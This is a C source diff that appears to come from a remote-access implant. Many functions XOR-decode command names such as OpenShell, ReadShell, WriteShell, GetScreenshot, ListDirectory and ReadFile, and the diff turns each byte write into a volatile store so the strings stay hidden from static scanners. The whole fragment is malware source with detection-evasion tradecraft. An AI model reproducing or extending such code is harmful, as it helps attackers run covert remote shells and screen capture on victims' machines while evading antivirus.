-    buf[1] = (CHAR)(0x18u ^ key);
-    buf[2] = (CHAR)(0x74u ^ key);
-    buf[3] = (CHAR)(0x52u ^ key);
-    buf[4] = (CHAR)(0x50u ^ key);
-    buf[5] = (CHAR)(0x5Bu ^ key);
-    buf[6] = (CHAR)(0x41u ^ key);
-    buf[7] = (CHAR)(0x18u ^ key);
-    buf[8] = (CHAR)(0x74u ^ key);
-    buf[9] = (CHAR)(0x47u ^ key);
-    buf[10] = (CHAR)(0x56u ^ key);
-    buf[11] = (CHAR)(0x5Du ^ key);
-    buf[12] = (CHAR)(0x0Fu ^ key);
-    buf[13] = (CHAR)(0x15u ^ key);
-    buf[14] = (CHAR)(0x54u ^ key);
-    buf[15] = (CHAR)(0x54u ^ key);
-    buf[16] = (CHAR)(0x47u ^ key);
-    buf[17] = (CHAR)(0x56u ^ key);
-    buf[18] = (CHAR)(0x5Du ^ key);
-    buf[19] = (CHAR)(0x03u ^ key);
-    buf[20] = (CHAR)(0x01u ^ key);
-    buf[21] = (CHAR)(0x38u ^ key);
-    buf[22] = (CHAR)(0x3Fu ^ key);
-    buf[23] = (CHAR)(0x6Du ^ key);
-    buf[24] = (CHAR)(0x18u ^ key);
-    buf[25] = (CHAR)(0x74u ^ key);
-    buf[26] = (CHAR)(0x52u ^ key);
-    buf[27] = (CHAR)(0x50u ^ key);
-    buf[28] = (CHAR)(0x5Bu ^ key);
-    buf[29] = (CHAR)(0x41u ^ key);
-    buf[30] = (CHAR)(0x18u ^ key);
-    buf[31] = (CHAR)(0x65u ^ key);
-    buf[32] = (CHAR)(0x47u ^ key);
-    buf[33] = (CHAR)(0x5Au ^ key);
-    buf[34] = (CHAR)(0x56u ^ key);
-    buf[35] = (CHAR)(0x50u ^ key);
-    buf[36] = (CHAR)(0x46u ^ key);
-    buf[37] = (CHAR)(0x46u ^ key);
-    buf[38] = (CHAR)(0x18u ^ key);
-    buf[39] = (CHAR)(0x74u ^ key);
-    buf[40] = (CHAR)(0x47u ^ key);
-    buf[41] = (CHAR)(0x56u ^ key);
-    buf[42] = (CHAR)(0x5Du ^ key);
-    buf[43] = (CHAR)(0x0Fu ^ key);
-    buf[44] = (CHAR)(0x54u ^ key);
-    buf[45] = (CHAR)(0x54u ^ key);
-    buf[46] = (CHAR)(0x47u ^ key);
-    buf[47] = (CHAR)(0x56u ^ key);
-    buf[48] = (CHAR)(0x5Du ^ key);
-    buf[49] = (CHAR)(0x03u ^ key);
-    buf[50] = (CHAR)(0x01u ^ key);
-    buf[51] = (CHAR)(0x38u ^ key);
-    buf[52] = (CHAR)(0x3Fu ^ key);
-    buf[53] = 0;
+    *(volatile CHAR *)&buf[0] = (0x6Du ^ key);
+    *(volatile CHAR *)&buf[1] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x5Bu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x41u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[12] = (0x0Fu ^ key);
+    *(volatile CHAR *)&buf[13] = (0x15u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[19] = (0x03u ^ key);
+    *(volatile CHAR *)&buf[20] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[21] = (0x38u ^ key);
+    *(volatile CHAR *)&buf[22] = (0x3Fu ^ key);
+    *(volatile CHAR *)&buf[23] = (0x6Du ^ key);
+    *(volatile CHAR *)&buf[24] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[25] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[26] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[27] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[28] = (0x5Bu ^ key);
+    *(volatile CHAR *)&buf[29] = (0x41u ^ key);
+    *(volatile CHAR *)&buf[30] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[31] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[32] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[33] = (0x5Au ^ key);
+    *(volatile CHAR *)&buf[34] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[35] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[36] = (0x46u ^ key);
+    *(volatile CHAR *)&buf[37] = (0x46u ^ key);
+    *(volatile CHAR *)&buf[38] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[39] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[41] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[42] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[43] = (0x0Fu ^ key);
+    *(volatile CHAR *)&buf[44] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[45] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[46] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[47] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[48] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[49] = (0x03u ^ key);
+    *(volatile CHAR *)&buf[50] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[51] = (0x38u ^ key);
+    *(volatile CHAR *)&buf[52] = (0x3Fu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[53] = 0;
 }
 static VOID StrNameBinMsg(PCHAR buf)
 {
     volatile UINT32 key = 0x6F;
-    buf[0] = (CHAR)(0x0Du ^ key);
-    buf[1] = (CHAR)(0x06u ^ key);
-    buf[2] = (CHAR)(0x01u ^ key);
-    buf[3] = (CHAR)(0x0Eu ^ key);
-    buf[4] = (CHAR)(0x1Du ^ key);
-    buf[5] = (CHAR)(0x16u ^ key);
-    buf[6] = (CHAR)(0x42u ^ key);
-    buf[7] = (CHAR)(0x02u ^ key);
-    buf[8] = (CHAR)(0x0Au ^ key);
-    buf[9] = (CHAR)(0x1Cu ^ key);
-    buf[10] = (CHAR)(0x1Cu ^ key);
-    buf[11] = (CHAR)(0x0Eu ^ key);
-    buf[12] = (CHAR)(0x08u ^ key);
-    buf[13] = (CHAR)(0x0Au ^ key);
-    buf[14] = 0;
+    *(volatile CHAR *)&buf[0] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[1] = (0x06u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x0Eu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x1Du ^ key);
+    *(volatile CHAR *)&buf[5] = (0x16u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x42u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x02u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x0Au ^ key);
+    *(volatile CHAR *)&buf[9] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x0Eu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x08u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x0Au ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[14] = 0;
 }
 
 static VOID StrNameBinFrag(PCHAR buf)
 {
     volatile UINT32 key = 0xCE;
-    buf[0] = (CHAR)(0xACu ^ key);
-    buf[1] = (CHAR)(0xA7u ^ key);
-    buf[2] = (CHAR)(0xA0u ^ key);
-    buf[3] = (CHAR)(0xAFu ^ key);
-    buf[4] = (CHAR)(0xBCu ^ key);
-    buf[5] = (CHAR)(0xB7u ^ key);
-    buf[6] = (CHAR)(0xE3u ^ key);
-    buf[7] = (CHAR)(0xA8u ^ key);
-    buf[8] = (CHAR)(0xBCu ^ key);
-    buf[9] = (CHAR)(0xAFu ^ key);
-    buf[10] = (CHAR)(0xA9u ^ key);
-    buf[11] = (CHAR)(0xA3u ^ key);
-    buf[12] = (CHAR)(0xABu ^ key);
-    buf[13] = (CHAR)(0xA0u ^ key);
-    buf[14] = (CHAR)(0xBAu ^ key);
-    buf[15] = 0;
+    *(volatile CHAR *)&buf[0] = (0xACu ^ key);
+    *(volatile CHAR *)&buf[1] = (0xA7u ^ key);
+    *(volatile CHAR *)&buf[2] = (0xA0u ^ key);
+    *(volatile CHAR *)&buf[3] = (0xAFu ^ key);
+    *(volatile CHAR *)&buf[4] = (0xBCu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xB7u ^ key);
+    *(volatile CHAR *)&buf[6] = (0xE3u ^ key);
+    *(volatile CHAR *)&buf[7] = (0xA8u ^ key);
+    *(volatile CHAR *)&buf[8] = (0xBCu ^ key);
+    *(volatile CHAR *)&buf[9] = (0xAFu ^ key);
+    *(volatile CHAR *)&buf[10] = (0xA9u ^ key);
+    *(volatile CHAR *)&buf[11] = (0xA3u ^ key);
+    *(volatile CHAR *)&buf[12] = (0xABu ^ key);
+    *(volatile CHAR *)&buf[13] = (0xA0u ^ key);
+    *(volatile CHAR *)&buf[14] = (0xBAu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[15] = 0;
 }
 
 static VOID StrNameUtf8Msg(PCHAR buf)
 {
     volatile UINT32 key = 0x31;
-    buf[0] = (CHAR)(0x44u ^ key);
-    buf[1] = (CHAR)(0x45u ^ key);
-    buf[2] = (CHAR)(0x57u ^ key);
-    buf[3] = (CHAR)(0x09u ^ key);
-    buf[4] = (CHAR)(0x1Cu ^ key);
-    buf[5] = (CHAR)(0x5Cu ^ key);
-    buf[6] = (CHAR)(0x54u ^ key);
-    buf[7] = (CHAR)(0x42u ^ key);
-    buf[8] = (CHAR)(0x42u ^ key);
-    buf[9] = (CHAR)(0x50u ^ key);
-    buf[10] = (CHAR)(0x56u ^ key);
-    buf[11] = (CHAR)(0x54u ^ key);
-    buf[12] = 0;
+    *(volatile CHAR *)&buf[0] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x57u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x42u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x42u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x54u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
 }
 
 static VOID StrNameUtf8Frag(PCHAR buf)
 {
     volatile UINT32 key = 0xC9;
-    buf[0] = (CHAR)(0xBCu ^ key);
-    buf[1] = (CHAR)(0xBDu ^ key);
-    buf[2] = (CHAR)(0xAFu ^ key);
-    buf[3] = (CHAR)(0xF1u ^ key);
-    buf[4] = (CHAR)(0xE4u ^ key);
-    buf[5] = (CHAR)(0xAFu ^ key);
-    buf[6] = (CHAR)(0xBBu ^ key);
-    buf[7] = (CHAR)(0xA8u ^ key);
-    buf[8] = (CHAR)(0xAEu ^ key);
-    buf[9] = (CHAR)(0xA4u ^ key);
-    buf[10] = (CHAR)(0xACu ^ key);
-    buf[11] = (CHAR)(0xA7u ^ key);
-    buf[12] = (CHAR)(0xBDu ^ key);
-    buf[13] = 0;
+    *(volatile CHAR *)&buf[0] = (0xBCu ^ key);
+    *(volatile CHAR *)&buf[1] = (0xBDu ^ key);
+    *(volatile CHAR *)&buf[2] = (0xAFu ^ key);
+    *(volatile CHAR *)&buf[3] = (0xF1u ^ key);
+    *(volatile CHAR *)&buf[4] = (0xE4u ^ key);
+    *(volatile CHAR *)&buf[5] = (0xAFu ^ key);
+    *(volatile CHAR *)&buf[6] = (0xBBu ^ key);
+    *(volatile CHAR *)&buf[7] = (0xA8u ^ key);
+    *(volatile CHAR *)&buf[8] = (0xAEu ^ key);
+    *(volatile CHAR *)&buf[9] = (0xA4u ^ key);
+    *(volatile CHAR *)&buf[10] = (0xACu ^ key);
+    *(volatile CHAR *)&buf[11] = (0xA7u ^ key);
+    *(volatile CHAR *)&buf[12] = (0xBDu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
 }
 
 static VOID StrNameClose(PCHAR buf)
 {
     volatile UINT32 key = 0x7E;
-    buf[0] = (CHAR)(0x1Du ^ key);
-    buf[1] = (CHAR)(0x12u ^ key);
-    buf[2] = (CHAR)(0x11u ^ key);
-    buf[3] = (CHAR)(0x0Du ^ key);
-    buf[4] = (CHAR)(0x1Bu ^ key);
-    buf[5] = 0;
+    *(volatile CHAR *)&buf[0] = (0x1Du ^ key);
+    *(volatile CHAR *)&buf[1] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x11u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[4] = (0x1Bu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[5] = 0;
 }
 
 static VOID StrNameUnknown(PCHAR buf)
 {
     volatile UINT32 key = 0x83;
-    buf[0] = (CHAR)(0xF6u ^ key);
-    buf[1] = (CHAR)(0xEDu ^ key);
-    buf[2] = (CHAR)(0xE8u ^ key);
-    buf[3] = (CHAR)(0xEDu ^ key);
-    buf[4] = (CHAR)(0xECu ^ key);
-    buf[5] = (CHAR)(0xF4u ^ key);
-    buf[6] = (CHAR)(0xEDu ^ key);
-    buf[7] = 0;
+    *(volatile CHAR *)&buf[0] = (0xF6u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xEDu ^ key);
+    *(volatile CHAR *)&buf[2] = (0xE8u ^ key);
+    *(volatile CHAR *)&buf[3] = (0xEDu ^ key);
+    *(volatile CHAR *)&buf[4] = (0xECu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xF4u ^ key);
+    *(volatile CHAR *)&buf[6] = (0xEDu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[7] = 0;
 }
 
 static VOID StrNameListDir(PCHAR buf)
 {
     volatile UINT32 key = 0x98;
-    buf[0] = (CHAR)(0xD4u ^ key);
-    buf[1] = (CHAR)(0xF1u ^ key);
-    buf[2] = (CHAR)(0xEBu ^ key);
-    buf[3] = (CHAR)(0xECu ^ key);
-    buf[4] = (CHAR)(0xDCu ^ key);
-    buf[5] = (CHAR)(0xF1u ^ key);
-    buf[6] = (CHAR)(0xEAu ^ key);
-    buf[7] = (CHAR)(0xFDu ^ key);
-    buf[8] = (CHAR)(0xFBu ^ key);
-    buf[9] = (CHAR)(0xECu ^ key);
-    buf[10] = (CHAR)(0xF7u ^ key);
-    buf[11] = (CHAR)(0xEAu ^ key);
-    buf[12] = (CHAR)(0xE1u ^ key);
-    buf[13] = 0;
+    *(volatile CHAR *)&buf[0] = (0xD4u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xF1u ^ key);
+    *(volatile CHAR *)&buf[2] = (0xEBu ^ key);
+    *(volatile CHAR *)&buf[3] = (0xECu ^ key);
+    *(volatile CHAR *)&buf[4] = (0xDCu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xF1u ^ key);
+    *(volatile CHAR *)&buf[6] = (0xEAu ^ key);
+    *(volatile CHAR *)&buf[7] = (0xFDu ^ key);
+    *(volatile CHAR *)&buf[8] = (0xFBu ^ key);
+    *(volatile CHAR *)&buf[9] = (0xECu ^ key);
+    *(volatile CHAR *)&buf[10] = (0xF7u ^ key);
+    *(volatile CHAR *)&buf[11] = (0xEAu ^ key);
+    *(volatile CHAR *)&buf[12] = (0xE1u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
 }
 
 static VOID StrNameReadFile(PCHAR buf)
 {
     volatile UINT32 key = 0x91;
-    buf[0] = (CHAR)(0xC3u ^ key);
-    buf[1] = (CHAR)(0xF4u ^ key);
-    buf[2] = (CHAR)(0xF0u ^ key);
-    buf[3] = (CHAR)(0xF5u ^ key);
-    buf[4] = (CHAR)(0xD7u ^ key);
-    buf[5] = (CHAR)(0xF8u ^ key);
-    buf[6] = (CHAR)(0xFDu ^ key);
-    buf[7] = (CHAR)(0xF4u ^ key);
-    buf[8] = 0;
+    *(volatile CHAR *)&buf[0] = (0xC3u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xF4u ^ key);
+    *(volatile CHAR *)&buf[2] = (0xF0u ^ key);
+    *(volatile CHAR *)&buf[3] = (0xF5u ^ key);
+    *(volatile CHAR *)&buf[4] = (0xD7u ^ key);
+    *(volatile CHAR *)&buf[5] = (0xF8u ^ key);
+    *(volatile CHAR *)&buf[6] = (0xFDu ^ key);
+    *(volatile CHAR *)&buf[7] = (0xF4u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
 }
 
 static VOID StrNameHashFile(PCHAR buf)
 {
     volatile UINT32 key = 0x1A;
-    buf[0] = (CHAR)(0x52u ^ key);
-    buf[1] = (CHAR)(0x7Bu ^ key);
-    buf[2] = (CHAR)(0x69u ^ key);
-    buf[3] = (CHAR)(0x72u ^ key);
-    buf[4] = (CHAR)(0x5Cu ^ key);
-    buf[5] = (CHAR)(0x73u ^ key);
-    buf[6] = (CHAR)(0x76u ^ key);
-    buf[7] = (CHAR)(0x7Fu ^ key);
-    buf[8] = 0;
+    *(volatile CHAR *)&buf[0] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x7Bu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x69u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x72u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x73u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
 }
 
 static VOID StrNameWriteShell(PCHAR buf)
 {
     volatile UINT32 key = 0x9F;
-    buf[0] = (CHAR)(0xC8u ^ key);
-    buf[1] = (CHAR)(0xEDu ^ key);
-    buf[2] = (CHAR)(0xF6u ^ key);
-    buf[3] = (CHAR)(0xEBu ^ key);
-    buf[4] = (CHAR)(0xFAu ^ key);
-    buf[5] = (CHAR)(0xCCu ^ key);
-    buf[6] = (CHAR)(0xF7u ^ key);
-    buf[7] = (CHAR)(0xFAu ^ key);
-    buf[8] = (CHAR)(0xF3u ^ key);
-    buf[9] = (CHAR)(0xF3u ^ key);
-    buf[10] = 0;
+    *(volatile CHAR *)&buf[0] = (0xC8u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xEDu ^ key);
+    *(volatile CHAR *)&buf[2] = (0xF6u ^ key);
+    *(volatile CHAR *)&buf[3] = (0xEBu ^ key);
+    *(volatile CHAR *)&buf[4] = (0xFAu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xCCu ^ key);
+    *(volatile CHAR *)&buf[6] = (0xF7u ^ key);
+    *(volatile CHAR *)&buf[7] = (0xFAu ^ key);
+    *(volatile CHAR *)&buf[8] = (0xF3u ^ key);
+    *(volatile CHAR *)&buf[9] = (0xF3u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[10] = 0;
 }
 
 static VOID StrNameReadShell(PCHAR buf)
 {
     volatile UINT32 key = 0x74;
-    buf[0] = (CHAR)(0x26u ^ key);
-    buf[1] = (CHAR)(0x11u ^ key);
-    buf[2] = (CHAR)(0x15u ^ key);
-    buf[3] = (CHAR)(0x10u ^ key);
-    buf[4] = (CHAR)(0x27u ^ key);
-    buf[5] = (CHAR)(0x1Cu ^ key);
-    buf[6] = (CHAR)(0x11u ^ key);
-    buf[7] = (CHAR)(0x18u ^ key);
-    buf[8] = (CHAR)(0x18u ^ key);
-    buf[9] = 0;
+    *(volatile CHAR *)&buf[0] = (0x26u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x11u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x15u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x27u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x11u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
 }
 
 static VOID StrNameGetDisplays(PCHAR buf)
 {
     volatile UINT32 key = 0x85;
-    buf[0] = (CHAR)(0xC2u ^ key);
-    buf[1] = (CHAR)(0xE0u ^ key);
-    buf[2] = (CHAR)(0xF1u ^ key);
-    buf[3] = (CHAR)(0xC1u ^ key);
-    buf[4] = (CHAR)(0xECu ^ key);
-    buf[5] = (CHAR)(0xF6u ^ key);
-    buf[6] = (CHAR)(0xF5u ^ key);
-    buf[7] = (CHAR)(0xE9u ^ key);
-    buf[8] = (CHAR)(0xE4u ^ key);
-    buf[9] = (CHAR)(0xFCu ^ key);
-    buf[10] = (CHAR)(0xF6u ^ key);
-    buf[11] = 0;
+    *(volatile CHAR *)&buf[0] = (0xC2u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xE0u ^ key);
+    *(volatile CHAR *)&buf[2] = (0xF1u ^ key);
+    *(volatile CHAR *)&buf[3] = (0xC1u ^ key);
+    *(volatile CHAR *)&buf[4] = (0xECu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xF6u ^ key);
+    *(volatile CHAR *)&buf[6] = (0xF5u ^ key);
+    *(volatile CHAR *)&buf[7] = (0xE9u ^ key);
+    *(volatile CHAR *)&buf[8] = (0xE4u ^ key);
+    *(volatile CHAR *)&buf[9] = (0xFCu ^ key);
+    *(volatile CHAR *)&buf[10] = (0xF6u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
 }
 
 static VOID StrNameGetScreenshot(PCHAR buf)
 {
     volatile UINT32 key = 0x46;
-    buf[0] = (CHAR)(0x01u ^ key);
-    buf[1] = (CHAR)(0x23u ^ key);
-    buf[2] = (CHAR)(0x32u ^ key);
-    buf[3] = (CHAR)(0x15u ^ key);
-    buf[4] = (CHAR)(0x25u ^ key);
-    buf[5] = (CHAR)(0x34u ^ key);
-    buf[6] = (CHAR)(0x23u ^ key);
-    buf[7] = (CHAR)(0x23u ^ key);
-    buf[8] = (CHAR)(0x28u ^ key);
-    buf[9] = (CHAR)(0x35u ^ key);
-    buf[10] = (CHAR)(0x2Eu ^ key);
-    buf[11] = (CHAR)(0x29u ^ key);
-    buf[12] = (CHAR)(0x32u ^ key);
-    buf[13] = 0;
+    *(volatile CHAR *)&buf[0] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x23u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x32u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x15u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x23u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x23u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x28u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x35u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x2Eu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x29u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[13] = 0;
 }
 
 static VOID StrNameCloseShell(PCHAR buf)
 {
     volatile UINT32 key = 0xE9;
-    buf[0] = (CHAR)(0xAAu ^ key);
-    buf[1] = (CHAR)(0x85u ^ key);
-    buf[2] = (CHAR)(0x86u ^ key);
-    buf[3] = (CHAR)(0x9Au ^ key);
-    buf[4] = (CHAR)(0x8Cu ^ key);
-    buf[5] = (CHAR)(0xBAu ^ key);
-    buf[6] = (CHAR)(0x81u ^ key);
-    buf[7] = (CHAR)(0x8Cu ^ key);
-    buf[8] = (CHAR)(0x85u ^ key);
-    buf[9] = (CHAR)(0x85u ^ key);
-    buf[10] = 0;
+    *(volatile CHAR *)&buf[0] = (0xAAu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x85u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x86u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x9Au ^ key);
+    *(volatile CHAR *)&buf[4] = (0x8Cu ^ key);
+    *(volatile CHAR *)&buf[5] = (0xBAu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x81u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x8Cu ^ key);
+    *(volatile CHAR *)&buf[8] = (0x85u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x85u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[10] = 0;
 }
 
 static VOID StrNameExit(PCHAR buf)
 {
     volatile UINT32 key = 0x69;
-    buf[0] = (CHAR)(0x2Cu ^ key);
-    buf[1] = (CHAR)(0x11u ^ key);
-    buf[2] = (CHAR)(0x00u ^ key);
-    buf[3] = (CHAR)(0x1Du ^ key);
-    buf[4] = 0;
+    *(volatile CHAR *)&buf[0] = (0x2Cu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x11u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x00u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x1Du ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[4] = 0;
 }
 
 static VOID StrNameOpenShell(PCHAR buf)
 {
     volatile UINT32 key = 0x75;
-    buf[0] = (CHAR)(0x3Au ^ key);
-    buf[1] = (CHAR)(0x05u ^ key);
-    buf[2] = (CHAR)(0x10u ^ key);
-    buf[3] = (CHAR)(0x1Bu ^ key);
-    buf[4] = (CHAR)(0x26u ^ key);
-    buf[5] = (CHAR)(0x1Du ^ key);
-    buf[6] = (CHAR)(0x10u ^ key);
-    buf[7] = (CHAR)(0x19u ^ key);
-    buf[8] = (CHAR)(0x19u ^ key);
-    buf[9] = 0;
+    *(volatile CHAR *)&buf[0] = (0x3Au ^ key);
+    *(volatile CHAR *)&buf[1] = (0x05u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x1Bu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x26u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x1Du ^ key);
+    *(volatile CHAR *)&buf[6] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x19u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x19u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
 }
 
